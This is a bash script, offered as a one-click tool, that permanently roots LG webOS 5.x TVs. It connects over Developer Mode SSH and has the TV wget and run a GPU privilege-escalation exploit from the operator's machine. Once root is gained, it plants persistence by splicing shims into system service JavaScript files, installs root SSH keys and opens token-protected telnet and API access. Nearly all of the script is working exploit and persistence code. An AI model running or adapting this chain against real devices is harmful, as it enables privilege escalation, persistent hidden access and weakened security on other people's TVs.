#!/usr/bin/env bash
# ============================================================
#  LG webOS 5.x one-click root, v2 (2026-10), Natxo
#  Permanent root (tested on LG CX + NANO95; other webOS 5.x likely)
#  GPU privilege-escalation exploit: JAMES McVAY (gfx_cred_escalate.py is his
#  work, published with full credit; the permanent chain is by Natxo)
# ============================================================
set -euo pipefail
cd "$(dirname "$0")"

echo "======================================================"
echo "  LG webOS 5.x ROOT, one-click v2"
echo "  (CX, NANO95 + other webOS 5.x models)"
echo "======================================================"
echo
echo "BEFORE YOU START (important):"
echo "  1. The TV must have DEVELOPER MODE enabled:"
echo "     LG 'Developer Mode' app -> sign in with an LG developer"
echo "     account -> 'Key Server' ON."
echo "  2. This computer and the TV on the SAME WiFi network."
echo "  3. It takes 15-30 minutes. WHILE IT RUNS:"
echo "     - do NOT turn the TV off (the power button only suspends it)"
echo "     - do NOT let it sleep: best is to WATCH TV on it"
echo "     - better disable first: Settings -> General -> Eco ->"
echo "       'Auto Power Off' / 'No Signal Power Off' / 'Timer'"
echo "  4. If your TV uses QuickStart+, the power button only"
echo "     suspends it; to really power off: unplug it for 30s."
echo
read -r -p "TV ready with Developer Mode on? (y/n) " ok
[ "${ok,,}" = "y" ] || { echo "Come back when it is ready."; exit 1; }

# ---- 1. TV IP ----
TV="${1:-}"
if [ -z "$TV" ]; then
  read -r -p "TV IP (shown in the Developer Mode app): " TV
fi
[ -n "$TV" ] || { echo "Empty IP"; exit 1; }
echo "-> TV: $TV"
MYIP="$(ipconfig getifaddr en0 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')"
[ -n "$MYIP" ] || { echo "Cannot find this computer's IP"; exit 1; }

# ---- 2. Dev Mode SSH key ----
mkdir -p "$HOME/.lg-cx-root"
KEY="$HOME/.lg-cx-root/webos_rsa"
if [ ! -s "$KEY" ]; then
  echo "-> Downloading the Key Server key (http://$TV:9991/webos_rsa)..."
  curl -sf "http://$TV:9991/webos_rsa" -o "$KEY" || {
    echo "ERROR: could not download the key."; echo
    echo "Check: (a) Key Server ON in the Developer Mode app";
    echo "(b) TV and computer on the same network. (c) the IP is correct.";
    exit 1; }
  chmod 600 "$KEY"
fi
# derive the pubkey, it becomes root's authorized_keys.
# ask for the passphrase ONLY if the key actually needs one, and feed it with -P:
# a bare ssh-keygen here prompts silently and people ended up typing it twice.
PASS=""
if ! ssh-keygen -y -P "" -f "$KEY" > payload/authorized_keys 2>/dev/null; then
  read -r -s -p "Passphrase (the 6 characters shown in the Developer Mode app): " PASS
  echo
  ssh-keygen -y -P "$PASS" -f "$KEY" > payload/authorized_keys 2>/dev/null || {
    echo "ERROR: wrong passphrase (it is the 6 characters shown in the Developer Mode app)."
    exit 1
  }
fi

# ---- 2b. sshd hostkey (the TV has NO ssh-keygen: PEM required) ----
echo "-> Generating hostkey (RSA 2048, PEM format)..."
rm -f payload/hostkey payload/hostkey.pub
ssh-keygen -t rsa -b 2048 -m PEM -N "" -f payload/hostkey -C lg-cx-root >/dev/null

# ---- 2c. hook with this computer's IP embedded (the exploit calls it with no args) ----
sed "s|__HOST__|$MYIP|g" payload/rootcmd_install.sh > payload/rootcmd.sh
chmod 755 payload/rootcmd.sh
grep -q "$MYIP" payload/rootcmd.sh || { echo "ERROR preparing the installer"; exit 1; }

cat > /tmp/lgcx.exp <<EOF
#!/usr/bin/expect -f
set timeout 25
spawn ssh -i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \\
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \\
  -p 9922 prisoner@$TV "echo CONNECTED_OK"
expect {
  "passphrase" { send "$PASS\r"; exp_continue }
  "CONNECTED_OK" { exit 0 }
  timeout { puts "TIMEOUT"; exit 1 }
  eof { exit 1 }
}
EOF
chmod +x /tmp/lgcx.exp
echo "-> Testing connection to the TV..."
if ! expect /tmp/lgcx.exp >/dev/null 2>&1; then
  echo "ERROR: could not connect on :9922 (wrong passphrase? Dev Mode off?)"
  exit 1
fi
echo "  x Connection OK"

# ---- 3. Serving the payload ----
PORT=8899
# app manifest (the installer registers them with a launcher icon)
ls payload/apps/*.ipk 2>/dev/null | xargs -n1 basename > payload/apps/manifest.txt || true
echo "-> Serving payload on :$PORT..."
python3 -m http.server $PORT >/dev/null 2>&1 &
SRV=$!
trap 'kill $SRV 2>/dev/null || true' EXIT

# ---- 4. Launch exploit + installer (python2 -u: without -u the log swallows the outcome) ----
LAUNCH="wget -q http://$MYIP:$PORT/payload/gfx_cred_escalate.py -O /tmp/gfx_cred_escalate.py && wget -q http://$MYIP:$PORT/payload/rootcmd.sh -O /tmp/rootcmd.sh && chmod 755 /tmp/gfx_cred_escalate.py /tmp/rootcmd.sh && wc -c /tmp/gfx_cred_escalate.py /tmp/rootcmd.sh; setsid nohup sh -c 'ulimit -n 4096 2>/dev/null; python2 -u /tmp/gfx_cred_escalate.py go > /tmp/gfx_go.log 2>&1' >/dev/null 2>&1 & echo LAUNCHED"

cat > /tmp/lgcx-run.exp <<EOF
#!/usr/bin/expect -f
set timeout 40
spawn ssh -i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \\
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \\
  -p 9922 prisoner@$TV {$LAUNCH}
expect {
  "passphrase" { send "$PASS\r"; exp_continue }
  "LAUNCHED" { exit 0 }
  timeout { exit 1 }
}
EOF
chmod +x /tmp/lgcx-run.exp
expect /tmp/lgcx-run.exp >/dev/null 2>&1 || { echo "ERROR launching the exploit"; exit 1; }
echo "-> Exploit launched. NOW: hands off the TV (15-30 min)..."

# ---- 5. Wait for :22 ----
ROOTOK=0
for i in $(seq 1 80); do
  sleep 30
  if python3 -c "import socket;s=socket.socket();s.settimeout(2);exit(0 if s.connect_ex(('$TV',22))==0 else 1)" 2>/dev/null; then
    ROOTOK=1
    break
  fi
  [ $((i % 4)) -eq 0 ] && echo "  ...waiting for root ($(($i/2)) min)"
done

if [ $ROOTOK -eq 0 ]; then
  echo
  echo "TIMEOUT: 40 min without :22. TV report:"
  cat > /tmp/lgcx-diag.exp <<EOF
#!/usr/bin/expect -f
set timeout 25
spawn ssh -i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \\
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \\
  -p 9922 prisoner@$TV {cat /tmp/ROOTED.txt 2>/dev/null; tail -5 /tmp/gfx_go.log 2>/dev/null}
expect {
  "passphrase" { send "$PASS\r"; exp_continue }
  eof { exit 0 }
}
EOF
  chmod +x /tmp/lgcx-diag.exp
  expect /tmp/lgcx-diag.exp 2>/dev/null | sed 's/^/  /'
  echo
  echo "Run the script again (it is retryable)."
  exit 1
fi

echo
echo "======================================================"
echo "  ROOT ACHIEVED (:22 open), final SSH stage"
echo "======================================================"

# ---- 6. Final SSH stage: persistence (chokidar OR nativehome) + verification ----
ssh -i "$KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -p 22 "root@$TV" 'sh -s' <<'EOS'
N=/media/developer/natxo
CG=/proc/1/root/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service
PERSIST=0

# path A: chokidar shim (CX and models with devmode chokidar)
for CGV in "$CG" "/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service"; do
  CH=$CGV/node_modules/chokidar
  if [ -f $CH/index.js ] && ! grep -q NATXO_BOOTROOT $CH/index.js 2>/dev/null; then
    [ -f $N/devmode-state/chokidar-index.js.ORIGINAL ] || cp $CH/index.js $N/devmode-state/chokidar-index.js.ORIGINAL
    cat $N/devmode-state/shim-chokidar.js $CH/index.js > /tmp/idx.tmp && cp /tmp/idx.tmp $CH/index.js
    echo "CHOKIDAR SHIM INSTALLED ($CGV)"
    PERSIST=1
  elif [ -f $CH/index.js ] && grep -q NATXO_BOOTROOT $CH/index.js 2>/dev/null; then
    PERSIST=1
  fi
done

# path B: nativehome hook (NANO95/E60, models with CYTV but no chokidar)
if [ $PERSIST -eq 0 ]; then
  for SVC in /media/developer/apps/usr/palm/services/com.local.nativehome.service \
             /media/cryptofs/apps/usr/palm/services/com.local.nativehome.service; do
    SJS=$SVC/service.js
    if [ -f "$SJS" ] && ! grep -q NATXO_NATIVEHOME_HOOK "$SJS" 2>/dev/null; then
      [ -f $N/devmode-state/nativehome-service.js.ORIGINAL ] || cp "$SJS" $N/devmode-state/nativehome-service.js.ORIGINAL
      cat "$SJS" $N/devmode-state/shim-nativehome.js > /tmp/sjs.tmp && cp /tmp/sjs.tmp "$SJS"
      echo "NATIVEHOME HOOK INSTALLED ($SVC)"
      PERSIST=1
    elif [ -f "$SJS" ] && grep -q NATXO_NATIVEHOME_HOOK "$SJS" 2>/dev/null; then
      PERSIST=1
    fi
  done
fi

[ $PERSIST -eq 1 ] && echo "PERSISTENCE: OK" || echo "PERSISTENCE: NONE (manual setup needed)"

# daemon token -> NZ Store (the ipk ships with a placeholder)
TOK=$(cat $N/daemon/token)
for CFG in /media/developer/apps/usr/palm/applications/com.natxobsd.nzstore/config.js \
           /media/cryptofs/apps/usr/palm/applications/com.natxobsd.nzstore/config.js; do
  [ -f "$CFG" ] && sed -i "s/NZ_TOKEN = '[^']*'/NZ_TOKEN = '$TOK'/" "$CFG" 2>/dev/null && echo "TOKEN_INJECT OK"
done
id -u
grep -E 'HOSTKEY|SHIM|NATIVEHOME|APP_|PORT22' /tmp/ROOTED.txt 2>/dev/null
EOS

TOKEN="$(ssh -i "$KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -p 22 "root@$TV" 'cat /media/developer/natxo/daemon/token' 2>/dev/null || true)"

echo
echo "  Token (telnet/API): ${TOKEN:-<see /media/developer/natxo/daemon/token>}"
echo "  Telnet:  telnet $TV   (password = the token)"
echo "  SSH:     ssh -i $KEY -p 22 root@$TV"
echo "  Status:  curl -H \"X-Natxo-Token: $TOKEN\" http://127.0.0.1:7777/status (from the TV)"
echo
echo "  The TV now boots rooted by itself. Enjoy!"
exit 0
